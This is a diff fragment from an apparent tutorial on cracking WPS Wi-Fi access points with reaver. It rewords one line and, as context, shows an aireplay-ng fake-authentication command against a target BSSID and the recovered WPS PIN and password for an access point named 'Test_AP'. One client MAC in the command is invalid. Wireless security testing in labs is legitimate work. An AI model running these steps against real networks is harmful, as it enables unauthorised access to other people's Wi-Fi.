@@ -349,7 +349,7 @@ no-associate - to tell reaver no to associate with the target network
 ```
 aireplay-ng --fakeauth 30 -a 70:97:41:DA:E0:5B -h 48:5D:60:45:G6:25 wlan0mon
 ```
-you see that wps pin is password:
+you can see "Terminal - 2" that wps pin is password:
 > WPS PIN : '12345670' <br>
 > WPS PSK : 'UAURWSXR' <br>
 > AP SSID : 'Test_AP' <br>
